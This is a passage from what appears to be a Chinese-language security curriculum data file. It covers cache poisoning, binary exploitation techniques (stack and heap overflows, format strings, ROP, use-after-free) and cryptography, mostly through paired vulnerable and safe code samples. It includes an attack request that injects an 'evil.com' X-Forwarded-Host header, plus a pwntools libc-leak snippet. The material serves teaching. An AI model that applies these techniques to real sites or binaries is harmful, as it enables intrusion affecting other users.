          refs: "OWASP GraphQL Cheat Sheet；GraphQL 官方安全指南"
        },
        {
          id: "cache-poison", name: "缓存投毒", level: "中级",
          summary: "利用 Web 缓存（CDN/反向代理）对未键输入的处理缺陷，将恶意响应缓存并投送给所有用户。",
          keywords: ["缓存投毒","cache poisoning","web cache","unkeyed","x-cache","cdn","投毒"],
          levels: {
            "入门": "网站常用缓存加速。如果缓存把某些请求头当成了区分不同用户的依据，攻击者就可能让缓存存下一份带毒的页面，发给之后所有访客。",
            "初级": "核心：缓存键（Cache Key）通常只含少数字段（Host、Path），而响应却受其他头（如 X-Forwarded-Host、User-Agent）影响但未被纳入键。攻击者在未键头里注入恶意内容（如 XSS payload 到页面），缓存后污染全体用户。",
            "中级": "实战：找 unkeyed 头（用 Param Miner 探测）；注入到反射处（如 base href、重定向）；使响应被缓存（状态 200、含 Cache-Control）。可结合 DOM XSS 实现稳定利用。防御：把所有影响响应的输入纳入缓存键，或规范化与剥离危险头。",
            "高级": "深入：缓存键规范化差异（不同 CDN 对头的处理）、缓存投毒到存储型 XSS、以及利用重定向链投毒。防御底线：绝不让未纳入缓存键的用户输入出现在响应体中。"
          },
          codeLang: "http",
          code:
`GET /en HTTP/1.1
Host: victim.com
X-Forwarded-Host: evil.com     # 未纳入缓存键，但被页面 base href 使用

# 响应被缓存后，所有用户访问 /en 都会加载 evil.com 的资源`,
          tool: "Burp Suite + Param Miner；被测目标需经 CDN/反向代理",
          refs: "PortSwigger Web Cache Poisoning；Web 缓存欺骗"
        }
      ]
    },

    /* ---------------- 二进制漏洞 ---------------- */
    {
      id: "binary", name: "二进制漏洞", icon: "🔧",
      desc: "从内存破坏到利用原语，理解程序底层安全机制（栈/堆/格式化/ROP）。",
      topics: [
        {
          id: "stack", name: "栈溢出基础", level: "入门",
          summary: "缓冲区写入越界覆盖返回地址，控制执行流。",
          keywords: ["栈溢出","stack overflow","缓冲区溢出","buffer overflow","返回地址","ret","shellcode","pwntools","溢出"],
          levels: {
            "入门": "程序在栈上开了一小块空间存你的输入，但没限制长度。你输入超长内容，就会盖住旁边的「返回地址」——这告诉程序执行完去哪。改掉它，就能把流程引到你指定的地方。",
            "初级": "经典栈溢出：覆盖 saved RIP/EBP 实现控制流劫持。利用前提：关闭保护（或绕过）后植入 shellcode，或直接跳到已有有用指令（如 system）。工具：pwntools 编写 exp，gdb/pwndbg 调试。",
            "中级": "绕过保护：DEP/NX（不可执行栈）→ ROP；ASLR（地址随机）→ 信息泄漏 + 爆破/偏移；Stack Canary（栈保护）→ 逐字节泄漏。掌握 32/64 位调用约定差异。",
            "高级": "结合泄漏构造稳定 ROP 链、Stack Pivot、绕过 Full RELRO，以及在现代编译选项下评估可利用性。理解「利用原语」与「控制流完整性（CFI）」对抗。"
          },
          codeLang: "c",
          code:
`// ❌ 危险：无边界检查（教学示例，编译请加栈保护以观察防护）
void vuln(char *s){
  char buf[16];
  strcpy(buf, s);   // 越界写入可覆盖返回地址
}
// ✅ 安全：限定长度
void safe(char *s){
  char buf[16];
  strncpy(buf, s, sizeof(buf)-1);
  buf[sizeof(buf)-1]=0;
}`,
          tool: "pwntools、GDB + pwndbg、objdump、checksec",
          refs: "《CTF 竞赛权威指南》；pwntools 文档；LiveOverflow 视频"
        },
        {
          id: "heap", name: "堆溢出与堆利用", level: "高级",
          summary: "利用堆管理器（ptmalloc）元数据实现任意写/释放利用。",
          keywords: ["堆溢出","heap","堆利用","ptmalloc","unlink","use after free","double free","tcache","fastbin","堆"],
          levels: {
            "入门": "除了栈，程序还在「堆」上动态申请内存。堆管理器用一些隐藏的「记账信息」管理空闲块。如果能改这些记账信息，就可能骗它把内存写到你指定的地方。",
            "初级": "ptmalloc 基础：chunk 结构、bins（fastbin/smallbin/largebin/tcache）、top chunk。常见利用：溢出改相邻 chunk 的 size、free 后重用。",
            "中级": "经典手法：unlink、double free、tcache poisoning、fastbin attack、off-by-one。需要精确控制堆布局（heap feng shui）。",
            "高级": "结合 House of 系列（Einherjar/Force/Orange）、IO_FILE 利用、以及 tcache 在现代 glibc 下的细节。强调：堆利用高度依赖 libc 版本，需 leak + 版本匹配。"
          },
          codeLang: "c",
          code:
`// ❌ 危险：堆块越界写（示意）
char *a = malloc(0x20); char *b = malloc(0x20);
read(0, a, 0x40);   // 多写的内容覆盖了 b 的元数据
// ✅ 安全：严格按分配大小读写，并使用 sized 读取接口
read(0, a, 0x20);`,
          tool: "pwndbg、libc-database、one_gadget、HeapInspect",
          refs: "glibc malloc 源码；how2heap 仓库"
        },
        {
          id: "fmt", name: "格式化字符串漏洞", level: "中级",
          summary: "format 参数可控导致任意读/写内存。",
          keywords: ["格式化字符串","format string","%x","%n","printf","任意读","任意写","fmtstr"],
          levels: {
            "入门": "打印函数（如 printf）把你的输入当成「格式」来解析。你可以用 %x 让它把栈上的内容打印出来，用 %n 让它把数字写到某个地址——这就成了读/写内存的钥匙。",
            "初级": "原理：printf(user_str) 时 user_str 含 %x/%p 会泄露栈，%n 写入。利用：泄漏栈/内存定位、写 GOT 劫持流程。",
            "中级": "任意写：用多个 %hn 分字节写目标地址（如改返回地址或 GOT 为 system）。处理宽度与位置（$ 操作符）精确寻址。",
            "高级": "在 PIE/RELRO 下仍需泄漏基址；理解现代编译器对格式字符串的静态检查与缓解，以及如何在审计中发现此类问题。"
          },
          codeLang: "c",
          code:
`// ❌ 危险：格式串来自用户输入
printf(user_input);
// ✅ 安全：固定格式
printf("%s", user_input);`,
          tool: "pwntools(fmtstr_payload)、pwndbg",
          refs: "《格式化字符串漏洞利用》；CTF wiki"
        },
        {
          id: "rop", name: "ROP 与漏洞利用缓解", level: "高级",
          summary: "面向返回编程绕过 NX，串联 gadgets 构造利用链。",
          keywords: ["rop","返回导向编程","gadget","nx","dep","aslr","canary","ret2libc","ret2syscall","缓解"],
          levels: {
            "入门": "当数据区不可执行（NX）时，不能放 shellcode。但可以「借用」程序里已经存在的零碎指令（gadget），像拼积木一样拼出一系列操作，最终调用系统函数。",
            "初级": "ret2libc（泄漏 libc + 调用 system）、ret2syscall（拼出 execve 系统调用）、ret2plt。需要 ROPgadget/ROPGadget 找 gadget。",
            "中级": "绕过 ASLR（泄漏地址）、绕过 canary（泄漏/不触碰）、绕过 PIE。构造稳定链并处理栈对齐（movaps 陷阱）。",
            "高级": "SROP、栈迁移（stack pivot）、以及理解 CFI/Shadow Call Stack/CET（硬件缓解）对 ROP 的对抗。评估真实可利用性而非仅理论。"
          },
          codeLang: "python",
          code:
`# pwntools 构造 ROP 链（示意，靶机环境）
from pwn import *
elf = ELF('./pwn')
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])   # 泄漏 libc
rop.call('main')                       # 回到主函数复用
raw_rop = rop.chain()`,
          tool: "ROPgadget、pwntools、checksec",
          refs: "《ROP 实战》；CTF wiki ROP 章节"
        },
        {
          id: "intovf", name: "整数溢出", level: "中级",
          summary: "整数运算回绕导致长度/索引校验失效。",
          keywords: ["整数溢出","integer overflow","回绕","wrap","符号错误","截断","size_t","长度校验"],
          levels: {
            "入门": "数字在电脑里有最大值，超过就「绕回」到很小或负数。如果程序用这个数做长度判断，绕回后可能绕过限制，造成后续缓冲区出问题。",
            "初级": "场景：size 计算回绕使 malloc 过小、有符号比较误判、截断（32→16 位）。常是「其他漏洞的引信」，而非独立利用。",
            "中级": "审计：乘法分配前的溢出、无符号回绕、数组索引越界。结合符号分析定位。",
            "高级": "在编译期/静态分析层面识别，并理解语言差异（C 未定义行为 vs Rust 默认 panic）。"
          },
          codeLang: "c",
          code:
`// ❌ 危险：乘法溢出（示意）
size_t n = count * sizeof(item);  // count 很大时回绕
buf = malloc(n);
// ✅ 安全：先检查再分配
if (count > MAX/sizeof(item)) return ERR;`,
          tool: "Fuzzer（AFL++）、静态分析（CodeQL）",
          refs: "CWE-190；Integer Overflow 指南"
        },
        {
          id: "race", name: "条件竞争 Race Condition", level: "中级",
          summary: "并发下「检查」与「使用」的竞态（TOCTOU）导致越权/超支。",
          keywords: ["条件竞争","race condition","竞态","toctou","并发","竞争","race","并发漏洞"],
          levels: {
            "入门": "程序有时先「检查」再做「操作」。如果检查和操作之间，另一个请求偷偷改了状态，就可能绕过检查。比如先查「余额够不够」，再扣款，中间被人并发抢先花掉，就超支了。",
            "初级": "典型：抽奖/优惠券/转账的金额竞态、文件上传与处理的 TOCTOU、权限检查与执行的间隙。利用：并发重放同一请求（Burp Intruder 多线程）。防御：原子操作、加锁、数据库事务隔离。",
            "中级": "实战：并行发送大量请求打到「检查通过但还没扣减」的窗口；利用无锁的计数、最后写入胜出。CTF 中常见于赠送/兑换逻辑。",
            "高级": "深入内核级竞态（double-fetch）、CPU 乱序与内存模型、以及如何在语言/框架层用乐观锁/悲观锁根治。竞态是「时序」问题，单线程测试永远发现不了。"
          },
          codeLang: "python",
          code:
`# ✅ 用数据库事务+行锁保证「检查与扣减」原子
with conn.begin():
    row = cur.execute("SELECT balance FROM acc WHERE id=%s FOR UPDATE", (uid,))
    if row.balance < amt: raise Error("insufficient")
    cur.execute("UPDATE acc SET balance=balance-%s WHERE id=%s", (amt, uid))`,
          tool: "Burp Intruder（多线程）、Turbo Intruder、race 脚本（授权）",
          refs: "OWASP Race Condition；CTF wiki"
        },
        {
          id: "fuzz", name: "模糊测试 Fuzzing", level: "初级",
          summary: "用模糊测试自动生成畸形输入，触发崩溃与漏洞。",
          keywords: ["fuzzing","模糊测试","fuzz","afl","afl++","覆盖率","崩溃","变异"],
          levels: {
            "入门": "与其手工想 payload，不如让程序自动生成海量随机/变异输入喂给目标，看它会不会崩。崩了往往意味着有内存破坏或解析缺陷。这是发现 0day 的主力方法之一。",
            "初级": "两类：dumb fuzzing（纯随机）与 coverage-guided（AFL++ 据代码覆盖率变异，效率高）。流程：选目标接口/解析器 → 喂变异输入 → 监控崩溃 → 复现分析。防御侧用它做健壮性测试。",
            "中级": "进阶：语料库种子、字典引导、持久模式（persistent mode）提速、崩溃去重（triaging）。结合 sanitizer（ASan/UBSan）定位根因。CTF 中常用于挖 binary 题的解析 bug。",
            "高级": "结构性 fuzzing（按语法生成输入）、内核/浏览器 fuzzing、以及将 fuzzing 纳入 CI 作为持续安全门禁。fuzzing 是「工程化发现」而非「理论分析」。"
          },
          codeLang: "bash",
          code:
`# ✅ 用 AFL++ 做覆盖率引导的模糊测试（本地解析器）
afl-fuzz -i in/ -o out/ -- ./parser @@
# 配合 AddressSanitizer 编译以捕获内存错误
clang -fsanitize=address -g parser.c -o parser`,
          tool: "AFL++、libFuzzer、Sanitizer（ASan/UBSan）",
          refs: "AFL++ 文档；Google Fuzzing 教程"
        },
        {
          id: "sandbox", name: "沙箱与系统调用过滤", level: "高级",
          summary: "理解沙箱/系统调用过滤（seccomp）及常见逃逸思路。",
          keywords: ["沙箱逃逸","sandbox","seccomp","系统调用","命名空间","容器逃逸","特权","capabilities"],
          levels: {
            "入门": "很多程序运行在「沙箱」里，被限制能调用的系统调用、能访问的文件。沙箱逃逸就是想办法突破这层限制，拿到更多权限或读不该读的东西。",
            "初级": "常见机制：seccomp 过滤系统调用、namespace 隔离、capabilities 最小权限、chroot。逃逸点：配置错误放开了危险 syscall（如 ptrace/execve）、容器以特权运行、挂载了宿主文件系统。",
            "中级": "容器逃逸：特权容器、挂载 docker.sock、CAP_SYS_ADMIN、写入 cgroup release_agent、利用内核漏洞。与二进制利用结合（先 info leak 再提权）。",
            "高级": "深入 seccomp 过滤器绕过（bpf 误配）、用户态与内核态边界、以及现代沙箱（gVisor、Firecracker）的威胁模型。沙箱是纵深防御的一环，不是银弹。"
          },
          codeLang: "c",
          code:
`// ✅ 用 seccomp 仅放行必要系统调用（示意）
struct sock_filter filter[] = { /* 白名单 read/write/exit */ };
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
// 绝不放开 ptrace/execve/mount 等危险调用`,
          tool: "seccomp-tools、gVisor、Firecracker、容器审计",
          refs: "seccomp BPF 文档；容器安全最佳实践"
        },
        {
          id: "mitigations", name: "二进制防护机制", level: "入门",
          summary: "理解 ASLR/PIE/Canary/NX/RELRO 等缓解措施，及其绕过前提。",
          keywords: ["防护机制","mitigation","aslr","pie","canary","nx","dep","relro","checksec","栈保护","地址随机化","缓解"],
          levels: {
            "入门": "现代系统给程序加了多道「锁」：栈不可执行、地址随机化、函数返回前检查栈有没有被破坏。这些「缓解措施」让老式攻击方法失效或变难。做题/审计前先看清开了哪些锁。",
            "初级": "五大件：NX/DEP（数据区不可执行，催生 ROP）、ASLR/PIE（地址随机，需泄漏）、Stack Canary（栈溢出检测，需逐字节泄漏）、RELRO（防止 GOT 覆写，Full RELRO 彻底只读）、FORTIFY（危险函数检查）。用 checksec 一眼看清。",
            "中级": "逐项绕过思路：NX→ROP；ASLR/PIE→信息泄漏拿基址；Canary→泄漏或避开返回地址；Partial RELRO→改 GOT；FORTIFY→绕过长度检查。实战常需组合。",
            "高级": "深入硬件缓解：CET（Intel CET/Shadow Stack）、ARM PAC/BTI、Control Flow Integrity（CFI）。理解「缓解是概率与成本」，而非绝对安全；评估真实可利用性是关键。"
          },
          codeLang: "bash",
          code:
`# 用 checksec 查看程序开了哪些防护
$ checksec --file=./vuln
  Arch:     amd64
  RELRO:    Partial RELRO
  Canary:   No
  NX:       Yes
  PIE:      Yes
  ASLR:     Yes (系统级)
# 编译时控制防护（仅练习用，生产应全开）：
gcc -fno-stack-protector -z execstack -no-pie vuln.c -o vuln`,
          tool: "checksec、pwntools、gdb/pwndbg",
          refs: "《CTF 竞赛权威指南》；RELRO/Canary 文档"
        },
        {
          id: "uaf", name: "释放后使用 UAF", level: "高级",
          summary: "内存被 free 后悬垂指针仍被访问，导致类型混淆/任意读写。",
          keywords: ["uaf","use after free","释放后使用","堆","double free","悬垂指针","dangling pointer","堆利用","类型混淆"],
          levels: {
            "入门": "程序把一块内存「释放」了（不用了），但后面又去读写它。这块内存可能已被系统分配给别的数据，于是你改的就成了「别人的数据」——这就是释放后使用，是堆漏洞的经典之一。",
            "初级": "UAF = free 之后仍持有指针并访问。危害：改写被复用 chunk 的元数据或对象虚表，实现任意读写/代码执行。常见场景：C++ 对象 delete 后未置空、缓存/连接池复用。",
            "中级": "利用：通过「释放→再利用（控制 reuse 的类型）→借助悬垂指针读写」构造类型混淆（type confusion）或改虚表指针（vtable）指向攻击者数据。需要精确堆布局与版本匹配（libc/类）。",
            "高级": "深入 C++ 对象生命周期、vtable 劫持、与浏览器/内核 UAF 的共通点、以及现代缓解（隔离堆、延迟释放、CFI/VTGuard）。UAF 修复靠「释放即置空 + 所有权模型（智能指针/Rust 所有权）」。"
          },
          codeLang: "c",
          code:
`// ❌ 危险：free 后仍使用（悬垂指针）
char *buf = malloc(32);
strcpy(buf, "hello");
free(buf);
// 此时 buf 已被回收，另一处 malloc 可能复用该内存
printf("%s", buf);            // UAF：读已被复用的内存

// ✅ 安全：释放后立即置空，或改用所有权/智能指针
free(buf); buf = NULL;        // C++ 推荐 std::unique_ptr 自动管理`,
          tool: "pwndbg、libc-database、ASan（发现 UAF）",
          refs: "CWE-416；how2heap；浏览器 UAF 分析文章"
        },
        {
          id: "int-overflow", name: "整数溢出与符号错误", level: "中级",
          summary: "整数回绕、截断与符号混淆导致边界检查被绕过，常见于 C/C++ 内存安全漏洞。",
          keywords: ["整数溢出","integer overflow","符号错误","signedness","截断","回绕","cve","size_t"],
          levels: {
            "入门": "程序用数字表示长度、大小。如果数字超过它能存的最大值会绕回成小的数，安全检查就被骗过，可能分配过小的缓冲区导致溢出。",
            "初级": "类型：无符号溢出回绕（0xFFFFFFFF+1=0）、有符号溢出（未定义行为）、符号混淆（size_t 与 int 比较，负值变巨大正数）。经典利用：绕过长度校验分配小数组，后续拷贝越界。",
            "中级": "实战：审计 malloc(len+1) 类计算；注意循环变量与数组下标符号；长度用 unsigned 但比较用 signed。缓解：使用安全整数类型（uint64_t）、调用 checked 算术（__builtin_add_overflow）。",
            "高级": "深入：编译器优化对溢出假设的影响（UB 可被优化删除检查）、以及整数问题在解引用越界后的完整利用链。强调：边界检查前必须确认运算无溢出且类型一致。"
          },
          codeLang: "c",
          code:
`// ❌ 危险：len 为有符号，且未检查乘法溢出
int len = user_len;
char *buf = malloc(len * sizeof(int));   // len 为负或过大时回绕/截断

// ✅ 安全：无符号 + 溢出检查
size_t len = user_len;
if (len > MAX || __builtin_mul_overflow(len, sizeof(int), &n)) return -1;`,
          tool: "ASan/UBSan、Ghidra、fuzzer",
          refs: "CWE-190；整数溢出手册"
        },
        {
          id: "fuzzing", name: "Fuzzing 与模糊测试", level: "中级",
          summary: "用自动化生成的海量畸形输入驱动程序，结合覆盖率或崩溃反馈发现未知漏洞。",
          keywords: ["fuzzing","模糊测试","afl","libfuzzer","覆盖率","crash","sanitizer","oss-fuzz"],
          levels: {
            "入门": "与其手工找漏洞，不如写个程序自动生成大量奇怪的输入丢给目标，看它会不会崩。崩了往往意味着有 bug。",
            "初级": "两类：盲 fuzz（随机或变异，无反馈）与覆盖率引导 fuzz（AFL/AFL++、libFuzzer 根据代码覆盖调整输入）。配合 Sanitizer（ASan/UBSan）能在崩溃前捕获内存错误。搭建：把目标编译进 harness，喂种子输入。",
            "中级": "实战：写 libFuzzer 的 LLVMFuzzerTestOneInput harness；用 AFL++ 持久模式；字典与语料提升覆盖率；崩溃去重与最小化（crashwalk）。持续 fuzz 在 CI 中价值最大。",
            "高级": "深入：结构感知 fuzz（语法或协议感知）、syzkaller 对内核、以及 fuzz 与符号执行或约束求解结合（Driller）。强调：fuzzing 不是替代审计，而是规模化发现浅层但真实的内存破坏。"
          },
          codeLang: "c",
          code:
`// ✅ libFuzzer harness 示例
#include <stdint.h>
extern "C" int LLVMFuzzerTestOneInput(const uint8_t* d, size_t n){
  parse_input(d, n);   // 被测函数
  return 0;
}
// 编译：clang -fsanitize=fuzzer,address parse.c fuzz.cc`,
          tool: "AFL++、libFuzzer、OSS-Fuzz、Sanitizer",
          refs: "AFL++ 文档；libFuzzer 教程；CWE-908"
        },
        {
          id: "toctou", name: "条件竞争与 TOCTOU", level: "中级",
          summary: "在检查与使用时资源状态被并发修改，常见于文件权限、余额、兑换等场景。",
          keywords: ["条件竞争","race condition","toctou","并发","竞态","余额","兑换","锁"],
          levels: {
            "入门": "程序先检查是否允许，再使用允许的结果。如果两个请求同时进来，可能都通过了检查，然后都执行，造成重复或越权。",
            "初级": "TOCTOU（Time-of-check to time-of-use）：检查文件名存在或权限，使用时已被替换。Web 场景：并发请求兑换、转账、上传覆盖、验证码复用。危害：余额被刷、文件被改、权限被提。",
            "中级": "实战：并发重放兑换或下单请求（Burp Turbo Intruder）；文件操作中检查后替换（符号链接攻击）；无原子性的库存扣减。防御：加锁或事务、原子操作（compare-and-swap）、服务端幂等。",
            "高级": "深入：分布式下的乐观锁与悲观锁选择、数据库事务隔离级别对竞态的影响、以及符号链接加权限的本地提权链。强调：凡是先查后做都要考虑并发，优先用数据库约束保证原子性。"
          },
          codeLang: "sql",
          code:
`-- ❌ 危险：先查后扣，非原子，并发可超卖
SELECT balance FROM u WHERE id=1;     -- 假设 100
UPDATE u SET balance=balance-100 WHERE id=1;  -- 两个并发都通过查

-- ✅ 安全：单条原子更新 + 约束
UPDATE u SET balance=balance-100 WHERE id=1 AND balance>=100;`,
          tool: "Burp Turbo Intruder、race 测试脚本",
          refs: "CWE-362；并发安全设计"
        }
      ]
    },

    /* ---------------- 密码学 ---------------- */
    {
      id: "crypto", name: "密码学", icon: "🔐",
      desc: "从对称/非对称到哈希与协议层攻击，重在「正确实现」而非自创算法。",
      topics: [
        {
          id: "sym", name: "对称加密", level: "入门",
          summary: "AES 等算法用同一密钥加解密，关注模式与 IV。",
          keywords: ["对称加密","aes","des","分组密码","cbc","ecb","iv","初始化向量","流密码","填充"],
          levels: {
            "入门": "对称加密像一把钥匙锁门也开门。同一个密钥既能加密也能解密。关键是：钥匙要够长、不能重复使用「钥匙+随机数(IV)」组合，否则会被看出规律。",
            "初级": "AES（128/192/256）为主；模式：ECB（不安全，相同明文得相同密文）、CBC、CTR、GCM（带认证）。IV 必须随机且唯一；GCM 提供机密性+完整性。",
            "中级": "攻击：ECB 块重排/像素还原、CBC 填充 oracle（POODLE）、nonce 复用导致密钥流重用（CTR/GCM）。正确实现：随机 IV、验证 TAG、避免自定义组合。",
            "高级": "深入 AEAD 选择、密钥派生（HKDF/PBKDF2/Argon2）、侧信道（时序/缓存），以及为何「不要用 ECB、不要自研模式」。"
          },
          codeLang: "python",
          code:
`# ✅ 使用 AES-GCM（带认证，首选）
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os
key = AESGCM.generate_key(bit_length=256)
aes = AESGCM(key)
nonce = os.urandom(12)            # 每次必须唯一
ct = aes.encrypt(nonce, b"secret", b"")  # 后者为附加认证数据`,
          tool: "openssl、cryptography 库、CyberChef",
          refs: "NIST SP 800-38D（GCM）；cryptography 官方文档"
        },
        {
          id: "asym", name: "非对称加密与 RSA", level: "中级",
          summary: "公钥加密/私钥解密，重点在 RSA 数学与实现陷阱。",
          keywords: ["非对称","rsa","公钥","私钥","模数","因式分解","低指数","rsa攻击","padding"],
          levels: {
            "入门": "一对钥匙：公钥公开（用来加密/验签），私钥保密（用来解密/签名）。你用别人公钥加密，只有他的私钥能解开。RSA 的安全性建立在「大数分解很难」。",
            "初级": "RSA：n=p*q，e 与 φ(n) 互素，d 为逆元。加密 c=m^e mod n。常见坑：e 太小、p,q 接近（费马分解）、n 共享因子。",
            "中级": "攻击：共模攻击、低加密指数（广播）、Coppersmith 相关消息、Padding Oracle（PKCS#1 v1.5）、RSA 签名伪造。正确做法：用 OAEP 填充、足够随机化。",
            "高级": "理解 RSA 与离散对数（DH/ECC）的区别、侧信道（计时/功耗）、以及后量子迁移（Kyber 等）。强调：不要自己实现 RSA 数学。"
          },
          codeLang: "python",
          code:
`# ✅ 用库完成 RSA，且使用 OAEP 填充
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
ct = priv.public_key().encrypt(
    b"msg",
    padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))`,
          tool: "openssl、RsaCtfTool（授权）、sagemath",
          refs: "NIST/CRYPTREC 建议；《图解密码技术》"
        },
        {
          id: "hash", name: "哈希与消息认证", level: "初级",
          summary: "SHA 系列、HMAC、以及哈希误用（长度扩展/碰撞）。",
          keywords: ["哈希","hash","md5","sha1","sha256","hmac","消息认证","完整性","长度扩展","彩虹表","加盐"],
          levels: {
            "入门": "哈希像「数据的指纹」：任意内容变固定长度摘要，且难以反推。但 MD5/SHA1 已不安全（可人为制造碰撞），密码存储更不能直接哈希，要加盐或用专用算法。",
            "初级": "用途：完整性校验、口令存储（bcrypt/argon2/scrypt）、消息认证（HMAC）。不要用 MD5/SHA1 做安全用途；不要裸哈希存密码。",
            "中级": "攻击：MD5/SHA1 碰撞、SHA-256 长度扩展攻击（当把 secret 直接前置拼接时）、彩虹表（靠盐对抗）。正确：HMAC 而非 hash(secret+msg)。",
            "高级": "深入 Merkle–Damgård 结构弱点、选择前缀碰撞、以及密钥派生与认证标签的设计原则。"
          },
          codeLang: "python",
          code:
`# ✅ 消息认证用 HMAC，而非 hash(secret+msg)
import hmac, hashlib
tag = hmac.new(key, msg, hashlib.sha256).digest()
# ✅ 口令存储用 Argon2/bcrypt（见认证主题）
# ❌ 错误：md5(password) 直接存储`,
          tool: "hashcat、john、openssl dgst",
          refs: "NIST FIPS 180/198；OWASP 口令存储备忘"
        },
        {
          id: "rand", name: "随机数安全", level: "中级",
          summary: "弱随机数是密码系统的「阿喀琉斯之踵」。",
          keywords: ["随机数","random","prng","csprng","种子","可预测","熵","mt19937","rand"],
          levels: {
            "入门": "密码学需要的随机必须「不可预测」。普通程序里的随机数（如 rand()）是按固定规则算出来的，知道前面几个就能猜出后面，绝不能用在密钥、令牌、验证码上。",
            "初级": "区分：rand()/mt19937（可预测伪随机，仅用于非安全场景）vs CSPRNG（/dev/urandom、os.urandom、SecureRandom）。CTF 常考：用可预测种子还原密钥。",
            "中级": "攻击：种子泄露/可预测（时间、固定值）、状态恢复（MT 序列反推）、熵不足。正确：统一用操作系统提供的 CSPRNG。",
            "高级": "深入硬件 RNG、DRBG（NIST SP 800-90A）、以及随机数生成失败导致的协议级灾难（如密钥重用）。"
          },
          codeLang: "python",
          code:
`# ✅ 安全随机：CSPRNG
import secrets
token = secrets.token_hex(16)   # 用于令牌/密钥
# ❌ 危险：可预测的伪随机
import random
weak = random.randint(0, 2**32)  # 可被还原`,
          tool: "randcrack（教学 MT 恢复）、各语言安全随机 API",
          refs: "NIST SP 800-90A/B/C"
        },
        {
          id: "ecc", name: "椭圆曲线密码 ECC", level: "高级",
          summary: "椭圆曲线密码（ECDSA/EdDSA）的数学与实现陷阱。",
          keywords: ["椭圆曲线","ecc","ecdsa","ed25519","椭圆曲线密码","曲线","标量乘法","nonce复用"],
          levels: {
            "入门": "除了 RSA，现代密码学大量用「椭圆曲线」：用更短的密钥达到同等安全。ECDSA 签名用在比特币、TLS 等。它的安全同样依赖随机数（nonce）不可预测。",
            "初级": "ECDSA 签名 = (r, s)，依赖临时随机数 k。若同一 k 签了两条消息，可解出私钥（比特币历史事故）。EdDSA（Ed25519）把 nonce 定为哈希，天然避免复用。",
            "中级": "攻击：nonce 复用/可预测导致私钥泄露、弱曲线（如小子群）、曲线参数被投毒。正确：用标准曲线（P-256/25519）、EdDSA 优先、nonce 必须 CSPRNG 或确定性派生。",
            "高级": "深入椭圆曲线离散对数假设、无效曲线攻击、侧信道（非恒定时间标量乘法）、以及后量子迁移。不要自选曲线或自实现点运算。"
          },
          codeLang: "python",
          code:
`# ✅ 用成熟库做 ECDSA / Ed25519（不要手搓点运算）
from cryptography.hazmat.primitives.asymmetric import ec
priv = ec.generate_private_key(ec.SECP256R1())   # P-256 标准曲线
# Ed25519 由库提供，nonce 确定性派生，避免复用问题`,
          tool: "openssl、sagemath、ECC 计算器（授权）",
          refs: "NIST SP 800-186；RFC 7748/8032"
        },
        {
          id: "tls", name: "TLS 与密钥协商", level: "中级",
          summary: "TLS 握手、密钥协商（DH/ECDH）与常见配置缺陷。",
          keywords: ["tls","ssl","握手","密钥协商","dh","ecdh","降级攻击","中间人","证书","https"],
          levels: {
            "入门": "你访问 https 网站时，浏览器和服务器先「握手」协商出一把临时密钥，之后通信都加密。TLS 的目标就是防止别人偷看或篡改。老版本 SSL/早期 TLS 有已知漏洞，要用新版本。",
            "初级": "密钥协商：RSA 密钥交换（已不推荐，无前向安全）vs DH/ECDHE（临时密钥，前向安全）。证书链与信任锚。防御：启用 TLS1.2/1.3、禁用 SSLv3/TLS1.0、HSTS。",
            "中级": "攻击：降级攻击（POODLE/FREAK）、证书校验错误、弱 DH 参数（Logjam）、Heartbleed（已在资讯）。配置：强套件、ECDHE 优先、OCSP Stapling。",
            "高级": "深入 0-RTT 重放、TLS1.3 的密钥分离、证书透明度（CT）、以及混合量子密钥交换。TLS 安全 = 版本 + 套件 + 证书 + 配置 共同决定。"
          },
          codeLang: "bash",
          code:
`# ✅ 仅启用强协议与套件（nginx 示意）
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
ssl_prefer_server_ciphers off;
# 启用 HSTS
add_header Strict-Transport-Security "max-age=63072000" always;`,
          tool: "testssl.sh、Qualys SSL Labs、openssl s_client",
          refs: "Mozilla TLS 配置指南；RFC 8446（TLS1.3）"
        },
        {
          id: "pqc", name: "后量子密码 PQC", level: "高级",
          summary: "后量子密码（抗量子）迁移：Kyber/CRYSTALS 与混合密钥交换。",
          keywords: ["后量子","post quantum","量子","kyber","dilithium","lattice","格密码","抗量子","nist"],
          levels: {
            "入门": "量子计算机成熟后，今天用的 RSA/椭圆曲线可能被快速破解。后量子密码研究「即使面对量子计算机也安全」的算法，主流方向是「格密码」。",
            "初级": "NIST 标准化：Kyber（密钥封装 KEM）、Dilithium（签名）、以及 SPHINCS+。迁移策略常采用「混合」：传统 + 后量子同时协商，任一安全即可。",
            "中级": "关注：密钥/签名尺寸变大带来的性能与协议改动、移植到 TLS/IPsec/SSH 的工程挑战、以及「现在截获、未来解密」（harvest-now-decrypt-later）威胁。",
            "高级": "深入格问题（LWE/SIS）困难性假设、侧信道与实现健壮性、以及混合握手的具体构造。迁移是长期工程，但敏感数据保密期长的系统应现在就规划。"
          },
          codeLang: "python",
          code:
`# ✅ 概念示意：混合密钥交换（传统 ECDH + Kyber），任一带即可保密
# 实际用 liboqs / OpenSSL 3.0 提供提供者，切勿手搓
shared = ecdhe_shared_secret() + kyber_encaps(peer_pk).shared
key = HKDF(shared)   # 合并派生最终密钥`,
          tool: "Open Quantum Safe (liboqs)、BoringSSL/OpenSSL 后量子实验",
          refs: "NIST PQC 标准化；RFC 9180（HPKE）"
        },
        {
          id: "blockmode", name: "分组密码模式", level: "初级",
          summary: "ECB/CBC/CTR/GCM 等模式的选择与 IV/nonce 纪律，决定加密是否安全。",
          keywords: ["分组密码模式","cbc","ecb","ctr","gcm","cfb","ofb","iv","初始化向量","填充","padding","aeac","模式"],
          levels: {
            "入门": "加密算法一次只能处理固定长度（如 AES 16 字节）的数据。怎么加密更长的文件？要靠「模式」把多次加密串起来。模式选错，再强的算法也白搭——最朴素的 ECB 会把重复的明文块变成重复的密文块。",
